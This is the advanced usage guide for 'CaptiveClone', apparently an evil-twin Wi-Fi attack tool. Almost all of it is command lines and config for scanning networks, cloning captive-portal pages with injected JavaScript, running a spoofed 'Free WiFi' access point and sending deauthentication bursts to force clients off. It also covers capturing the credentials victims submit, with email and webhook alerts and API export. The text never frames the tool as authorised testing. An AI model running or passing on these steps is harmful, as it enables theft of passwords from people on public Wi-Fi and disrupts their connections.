# CaptiveClone Advanced Usage Guide

This guide covers advanced usage scenarios, configuration options, and customization techniques for CaptiveClone. It's intended for users already familiar with the basic functionality documented in the [User Guide](USER_GUIDE.md).

## Table of Contents

1. [Configuration File](#configuration-file)
2. [Advanced Scanning Options](#advanced-scanning-options)
3. [Custom Portal Analysis](#custom-portal-analysis)
4. [Advanced Portal Cloning](#advanced-portal-cloning)
5. [Access Point Configuration](#access-point-configuration)
6. [Deauthentication Techniques](#deauthentication-techniques)
7. [Credential Capture Options](#credential-capture-options)
8. [Database Customization](#database-customization)
9. [API Integration](#api-integration)
10. [Scripting and Automation](#scripting-and-automation)

## Configuration File

CaptiveClone uses a YAML configuration file (`config.yaml`) to manage settings. The configuration is organized into sections:

```yaml
# Basic configuration
general:
  debug_mode: false
  log_level: INFO
  log_file: captiveclone.log
  db_path: captiveclone.db

# Scanner settings
scanner:
  timeout: 30
  channels: [1, 6, 11]
  retries: 3
  hop_interval: 0.5
  detect_hidden: true

# Portal analysis settings
portal_analyzer:
  timeout: 60
  user_agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
  headless: true
  extract_assets: true
  max_depth: 3
  follow_redirects: true

# Portal cloning settings
portal_cloner:
  output_dir: clones
  rewrite_links: true
  include_js: true
  include_css: true
  include_images: true
  proxy_external: false
  
# Access point settings
access_point:
  interface: wlan1
  channel: 6
  ssid: "Free WiFi"
  hidden: false
  ip_range: "192.168.87.0/24"
  gateway: "192.168.87.1"
  dhcp_start: "192.168.87.100"
  dhcp_end: "192.168.87.200"
  dns: ["8.8.8.8", "8.8.4.4"]
  
# Deauthentication settings
deauth:
  interface: wlan0
  packets_per_burst: 10
  burst_interval: 0.5
  max_retries: 5
  target_all: true
  blacklist: []

# Credential capture settings
credential_capture:
  port: 8080
  output_dir: captures
  format: json
  notify: true
  encrypt: true
  key_file: credential_key.key

# Database settings
database:
  type: sqlite
  path: captiveclone.db
  # Uncomment for PostgreSQL
  # connection_string: postgresql://user:password@localhost/captiveclone
  # pool_size: 5

# Web interface settings
web_interface:
  host: "127.0.0.1"
  port: 5000
  debug: false
  ssl: false
  # Uncomment for SSL
  # ssl_cert: "cert.pem"
  # ssl_key: "key.pem"

# Notification settings
notifications:
  mail:
    enabled: false
    server: smtp.example.com
    port: 587
    use_tls: true
    username: your_username
    password: your_password
    default_sender: alerts@example.com
  webhook:
    enabled: false
    url: https://example.com/webhook
  sound:
    enabled: true
    success: success.mp3
    alert: alert.mp3
    error: error.mp3

# Security settings
security:
  enable_login: true
  session_timeout: 3600
  max_attempts: 5
  users:
    admin:
      password: argon2_hash
      role: admin
    viewer:
      password: argon2_hash
      role: viewer
```

You can override settings via environment variables using the `CAPTIVECLONE_` prefix and uppercase setting names with underscores, e.g., `CAPTIVECLONE_SCANNER_TIMEOUT=60`.

## Advanced Scanning Options

### Channel Hopping Strategies

Configure custom channel hopping strategies for more efficient scanning:

```bash
sudo python captiveclone.py scan --interface wlan0 --hop-strategy custom --channels 1,6,11,36,40
```

Available strategies:
- `all`: Scan all available channels
- `2.4ghz`: Only scan 2.4GHz channels
- `5ghz`: Only scan 5GHz channels
- `custom`: Scan specified channels

### SSID Filtering

Filter scan results by SSID pattern:

```bash
sudo python captiveclone.py scan --interface wlan0 --filter "Hotel|Guest|WiFi"
```

### Advanced Detection Options

Enable multiple captive portal detection methods:

```bash
sudo python captiveclone.py scan --interface wlan0 --detection-methods dns,http,redirect,content
```

## Custom Portal Analysis

### Browser Configuration

Configure the headless browser for portal analysis:

```bash
sudo python captiveclone.py analyze http://example.com --user-agent "Custom Agent" --timeout 120 --window-size 1920x1080
```

### Authentication Handling

Analyze portals requiring basic authentication:

```bash
sudo python captiveclone.py analyze http://example.com --auth username:password
```

### Cookie Management

Preserve cookies between analysis sessions:

```bash
sudo python captiveclone.py analyze http://example.com --cookies-file cookies.json --save-cookies
```

### JavaScript Execution

Control JavaScript execution during analysis:

```bash
sudo python captiveclone.py analyze http://example.com --js-enabled true --wait-for-js 5
```

## Advanced Portal Cloning

### Asset Filtering

Selectively include or exclude assets:

```bash
sudo python captiveclone.py clone http://example.com --include "\.css$|\.js$|\.png$" --exclude "analytics|tracking"
```

### Form Handling

Customize form field mapping and handling:

```bash
sudo python captiveclone.py clone http://example.com --map-field "username:email" --map-field "pass:password"
```

### External Resources

Control handling of external resources:

```bash
sudo python captiveclone.py clone http://example.com --proxy-external --external-domains "cdn.example.com,api.example.com"
```

### Custom Injection

Inject custom JavaScript for advanced functionality:

```bash
sudo python captiveclone.py clone http://example.com --inject-js captureScript.js
```

## Access Point Configuration

### MAC Address Spoofing

Spoof the MAC address of the access point:

```bash
sudo python captiveclone.py ap "Free WiFi" --interface wlan1 --mac 00:11:22:33:44:55
```

### Captive Portal Integration

Integrate with the cloned captive portal:

```bash
sudo python captiveclone.py ap "Free WiFi" --interface wlan1 --portal-dir clones/hotel_wifi
```

### Advanced DHCP/DNS Configuration

Configure custom DHCP and DNS settings:

```bash
sudo python captiveclone.py ap "Free WiFi" --interface wlan1 --ip-range 192.168.100.0/24 --gateway 192.168.100.1 --dns 1.1.1.1 --dhcp-start 192.168.100.100 --dhcp-end 192.168.100.200
```

### Multiple SSIDs

Create multiple SSIDs on a single interface (if supported):

```bash
sudo python captiveclone.py ap --multi-ssid --ssids "Free WiFi,Guest Network,Hotel Service" --interface wlan1
```

## Deauthentication Techniques

### Selective Targeting

Target specific clients with custom deauthentication patterns:

```bash
sudo python captiveclone.py deauth 00:11:22:33:44:55 --interface wlan0 --client AA:BB:CC:DD:EE:FF --client 11:22:33:44:55:66 --burst 15 --interval 0.3
```

### Timed Deauthentication

Schedule deauthentication for specific durations:

```bash
sudo python captiveclone.py deauth 00:11:22:33:44:55 --interface wlan0 --duration 30 --pause 10 --cycles 3
```

### Client Blacklisting

Prevent deauthentication of specific clients:

```bash
sudo python captiveclone.py deauth 00:11:22:33:44:55 --interface wlan0 --all --blacklist AA:BB:CC:DD:EE:FF
```

## Credential Capture Options

### Real-time Notifications

Configure real-time notifications for captured credentials:

```bash
sudo python captiveclone.py capture --port 8080 --notify-email admin@example.com --notify-webhook https://example.com/hook
```

### Custom Export Formats

Export captured credentials in different formats:

```bash
sudo python captiveclone.py capture --port 8080 --output captures/ --format json,csv,yaml
```

### Field Validation

Enable validation for captured credentials:

```bash
sudo python captiveclone.py capture --port 8080 --validate
```

### Encryption Options

Configure custom encryption for sensitive fields:

```bash
sudo python captiveclone.py capture --port 8080 --encrypt --key-file custom_key.key
```

## Database Customization

### Using PostgreSQL

Configure CaptiveClone to use PostgreSQL instead of SQLite:

1. Edit `config.yaml`:
   ```yaml
   database:
     type: postgresql
     connection_string: postgresql://user:password@localhost/captiveclone
     pool_size: 5
   ```

2. Create the database and user:
   ```bash
   sudo -u postgres psql -c "CREATE USER captiveclone WITH PASSWORD 'your_password';"
   sudo -u postgres psql -c "CREATE DATABASE captiveclone OWNER captiveclone;"
   ```

### Data Partitioning

For large datasets, enable data partitioning:

```yaml
database:
  type: postgresql
  connection_string: postgresql://user:password@localhost/captiveclone
  partitioning:
    enabled: true
    interval: monthly
    cleanup_age: 90  # days
```

## API Integration

CaptiveClone provides a RESTful API for integration with other tools:

### API Authentication

Create an API key:

```bash
sudo python captiveclone.py api-key create --name "integration-tool" --expires 90
```

### Example API Requests

```bash
# List all networks
curl -H "Authorization: Bearer YOUR_API_KEY" http://localhost:5000/api/networks

# Get network details
curl -H "Authorization: Bearer YOUR_API_KEY" http://localhost:5000/api/networks/1

# Start a scan
curl -X POST -H "Authorization: Bearer YOUR_API_KEY" -H "Content-Type: application/json" -d '{"interface":"wlan0", "timeout":30}' http://localhost:5000/api/scan

# Get credentials
curl -H "Authorization: Bearer YOUR_API_KEY" http://localhost:5000/api/credentials
```

## Scripting and Automation

### Python Script Integration

You can integrate CaptiveClone into your Python scripts:

```python
from captiveclone.core.scanner import NetworkScanner
from captiveclone.core.portal_analyzer import PortalAnalyzer
from captiveclone.core.portal_cloner import PortalCloner

# Initialize scanner
scanner = NetworkScanner(interface="wlan0")

# Scan for networks
networks = scanner.scan(timeout=30)

# Find networks with captive portals
captive_networks = [n for n in networks if n.has_captive_portal]

if captive_networks:
    # Select first network with a captive portal
    target = captive_networks[0]
    
    # Analyze portal
    analyzer = PortalAnalyzer()
    portal_data = analyzer.analyze(target.captive_url)
    
    # Clone portal
    cloner = PortalCloner()
    clone_dir = cloner.clone(portal_data, output_dir="clones/custom")
    
    print(f"Portal cloned to: {clone_dir}")
```

### Scheduled Operations

Set up scheduled operations using cron jobs:

```bash
# Edit crontab
crontab -e

# Add scheduled tasks
# Run a scan every hour
0 * * * * cd /path/to/captiveclone && sudo python captiveclone.py scan --interface wlan0 --output scans/hourly_$(date +\%Y\%m\%d\%H).json

# Generate a daily report at midnight
0 0 * * * cd /path/to/captiveclone && sudo python captiveclone.py report --period day --output reports/daily_$(date +\%Y\%m\%d).pdf
```

### Custom Hooks

Create custom hooks for workflow automation:

```bash
# When a credential is captured
sudo python captiveclone.py hooks add credential_captured /path/to/your/script.sh

# When an access point gets a new client
sudo python captiveclone.py hooks add client_connected /path/to/notification.sh
```

## Performance Tuning

Optimize performance for resource-constrained environments like Raspberry Pi:

```yaml
# In config.yaml
performance:
  # Reduce memory usage
  low_memory_mode: true
  # Disable heavy features
  disable_browser_preview: true
  # Cache aggressively
  aggressive_caching: true
  # Reduce polling interval
  polling_interval: 5
```

For more information on any of these advanced topics, please refer to the API documentation or open an issue on GitHub. 